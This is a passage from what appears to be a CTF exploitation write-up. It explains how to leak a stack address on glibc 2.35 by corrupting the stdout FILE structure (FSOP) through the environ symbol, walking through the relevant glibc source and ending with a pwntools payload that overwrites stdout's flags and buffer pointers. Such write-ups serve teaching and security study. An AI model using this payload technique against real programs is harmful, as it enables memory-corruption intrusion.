<p>I didn&rsquo;t see first that only <code>PARTIAL RELRO</code> was enabled on the libc, so the technique I show you here was thought to face a <code>2.35</code> libc with <code>FULL RELRO</code> enabled that the reason why I didn&rsquo;t just hiijack some GOT pointers within the libc (like <code>strlen</code> for example).</p>
<p>A pretty convenient way to gain code execution when the hooks (<code>__malloc_hook</code>, <code>__free_hook</code>) are not present (since <code>2.32</code> cf <a
  class="gblog-markdown__link"
  href="https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html"
  
  >this for 2.34</a
>) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the <code>environ</code> symbol stored in the dynamic linker, it contains a pointer toward <code>envp</code>.</p>
<p>To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on <code>stdout</code> for example. To dig more FSOP I advise you to read <a
  class="gblog-markdown__link"
  href="https://nasm.re/posts/onceforall/"
  
  >this write-up</a
> as well as <a
  class="gblog-markdown__link"
  href="https://nasm.re/posts/bookwriter/"
  
  >this one</a
>.</p>
<p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used right after the <code>fgets</code> that reads the input from the user by using the <code>putchar</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with a resource by just by opening it and getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already done some stuff with files on linux. Here is its definition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
</span><span class="c1"></span><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
</span><span class="cm">   C++ mangled names for functions taking FILE* arguments.
</span><span class="cm">   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="cp"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="n">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don&#39;t get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div><p>Here are brievly role of each fields:</p>
<ul>
<li><code>_flags</code> stands for the behaviour of the stream when a file operation occurs.</li>
<li><code>_IO_read_ptr</code> address of input within the input buffer that has been already used.</li>
<li><code>_IO_read_end</code> end address of the input buffer.</li>
<li><code>_IO_read_base</code> base address of the input buffer.</li>
<li><code>_IO_write_base</code> base address of the ouput buffer.</li>
<li><code>_IO_write_ptr</code> points to the character that hasn&rsquo;t been printed yet.</li>
<li><code>_IO_write_end</code> end address of the output buffer.</li>
<li><code>_IO_buf_base</code> base address for both input and output buffer.</li>
<li><code>_IO_buf_end</code> end address for both input and output buffer.</li>
<li><code>_chain</code> stands for the single linked list that links of all file streams.</li>
<li><code>_fileno</code> stands for the file descriptor associated to the file.</li>
<li><code>_vtable_offset</code> stands for the offset of the vtable we have to use.</li>
<li><code>_offset</code> stands for the current offset within the file.</li>
</ul>
<p>Relatable flags:</p>
<ul>
<li><code>_IO_USER_BUF</code> During line buffered output, _IO_write_base==base() &amp;&amp; epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a &lsquo;\n&rsquo;, then C is inserted, and pptr() incremented.</li>
<li><code>_IO_MAGIC</code> Magic number of <code>fp-&gt;_flags</code>.</li>
<li><code>_IO_UNBUFFERED</code> If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.</li>
<li><code>_IO_LINKED</code> In the list of all open files.</li>
</ul>
<p>To understand I advise you to read this <a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >great article</a
> about FILE structures. What we gonna do right now is trying to understand the use of <code>stdout</code> during within the <code>putchar</code> function. And we will try to find a code path that will not write the provided argument (in this case the <code>\n</code> taken by <code>putchar</code>) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.
Let&rsquo;s take a closer look at the <code> __putc_unlocked_body</code> macro:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106
</span><span class="c1"></span><span class="cp">#define __putc_unlocked_body(_ch, _fp)					\
</span><span class="cp">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)	\
</span><span class="cp">   ? __overflow (_fp, (unsigned char) (_ch))				\
</span><span class="cp">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))
</span><span class="cp"></span>
</code></pre></div><p>It ends up calling <code>__overflow</code> if there is no more space in the output buffer (<code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)</code>). That&rsquo;s basically the code path we need to trigger to call <code>__overflow</code> instead of just write the provided char into the output buffer.
So first condition:</p>
<ul>
<li><code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
</span><span class="c1"></span><span class="kt">int</span>
<span class="nf">__overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* This is a single-byte stream.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Given the file stream isn&rsquo;t oriented (byte granularity) we directly reach the <code>_IO_OVERFLOW</code> call, now the final goal to get a leak is to reach the <code>_IO_do_write</code> call:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
</span><span class="c1"></span>
<span class="kt">int</span>
<span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
    <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="cm">/* If currently reading or no buffer allocated. */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Allocate a buffer if needed. */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	<span class="p">}</span>
      <span class="cm">/* Otherwise must be currently reading.
</span><span class="cm">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
</span><span class="cm">	 logically slide the buffer forwards one block (by setting the
</span><span class="cm">	 read pointers to all point at the beginning of the block).  This
</span><span class="cm">	 makes room for subsequent output.
</span><span class="cm">	 Otherwise, set the read pointers to _IO_read_end (leaving that
</span><span class="cm">	 alone, so it can continue to correspond to the external position). */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">f</span><span class="p">)))</span>
	<span class="p">{</span>
	  <span class="n">size_t</span> <span class="n">nbackup</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="n">_IO_free_backup_area</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-=</span> <span class="n">MIN</span> <span class="p">(</span><span class="n">nbackup</span><span class="p">,</span>
				   <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">)</span>
	    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>

      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
	<span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
			 <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="p">)</span> <span class="cm">/* Buffer is really full */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="o">*</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">)</span>
      <span class="o">||</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_LINE_BUF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
		      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">ch</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">)</span>

</code></pre></div><p>Given <code>ch</code> is <code>\n</code>, to trigger the <code>_IO_do_flush</code> call which will flush the file stream we have to:</p>
<ul>
<li>Remove <code>_IO_NO_WRITES</code> from <code>fp-&gt;_flags</code> to avoid the first condition.</li>
<li>Add <code>_IO_CURRENTLY_PUTTING</code> to <code>fp-&gt;_flags</code> and give a non <code>NULL</code> value to <code>f-&gt;_IO_write_base</code> to avoid the second condition (useless code).</li>
<li>make <code>f-&gt;_IO_write_ptr</code> equal to <code>f-&gt;_IO_buf_end</code> to then call <code>_IO_do_flush</code>.</li>
</ul>
<p>Now we reached <code>_IO_do_flush</code> which is basically just a macro:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507
</span><span class="c1"></span><span class="cp">#define _IO_do_flush(_f) \
</span><span class="cp">  ((_f)-&gt;_mode &lt;= 0							      \
</span><span class="cp">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
</span><span class="cp">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
</span><span class="cp">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
</span><span class="cp">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
</span><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
</span><span class="cp"></span>
</code></pre></div><p>Given <code>stdout</code> is byte-oriented <code>_IO_new_do_write</code> is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
<span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418
</span><span class="c1"></span><span class="k">static</span> <span class="n">size_t</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="n">size_t</span><span class="p">);</span>

<span class="cm">/* Write TO_DO bytes from DATA to FP.
</span><span class="cm">   Then mark FP as having empty buffers. */</span>

<span class="kt">int</span>
<span class="nf">_IO_new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span>
	  <span class="o">||</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">new_do_write</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">==</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_do_write</span><span class="p">,</span> <span class="n">_IO_do_write</span><span class="p">)</span>

<span class="k">static</span> <span class="n">size_t</span>
<span class="n">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
    <span class="cm">/* On a system without a proper O_APPEND implementation,
</span><span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is
</span><span class="cm">       not needed nor desirable for Unix- or Posix-like systems.
</span><span class="cm">       Instead, just indicate that offset (before and after) is
</span><span class="cm">       unpredictable. */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">off64_t</span> <span class="n">new_pos</span>
	<span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
	    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">=</span> <span class="n">_IO_adjust_column</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span>
		       <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
		       <span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_IO_buf_base</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div><p>To avoid the <code>_IO_SYSSEEK</code> which could break stdout, we can add <code>_IO_IS_APPENDING</code> to <code>fp-&gt;_flags</code>. Then <code>_IO_SYSWRITE</code> is called and prints <code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base</code> bytes from <code>(_f)-&gt;_IO_write_base</code> to stdout. But that&rsquo;s not finished, right after we got the stack leak <code>new_do_write</code> initializes the output / input buffer to <code>_IO_buf_base</code> except for the output buffer which is initialized to <code>_IO_buf_end</code> (<code>_IO_LINE_BUF</code> not present). Thus we have to make <code>fp-&gt;_IO_buf_base</code> and <code>fp-&gt;_IO_buf_end</code> equal to valid writable pointers.</p>
<p>Thus we just need to:</p>
<ul>
<li><code>fp-&gt;_flags</code> = (<code>fp-&gt;_flags</code> &amp; ~(<code>_IO_NO_WRITES</code>)) | <code>_IO_CURRENTLY_PUTTING</code> | <code>_IO_IS_APPENDING</code>.</li>
<li><code>f-&gt;_IO_write_ptr</code> = <code>fp-&gt;_IO_write_end</code> = <code>f-&gt;_IO_buf_end</code> = <code>&amp;environ + 8</code>.</li>
<li><code>fp-&gt;_IO_write_base</code> = <code>&amp;environ</code>.</li>
</ul>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> 
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _flags</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="c1"># _IO_read_*</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _IO_write_base</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="c1"># _IO_write_ptr + _IO_write_end</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _IO_buf_base</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># _IO_buf_end</span>
    <span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> 

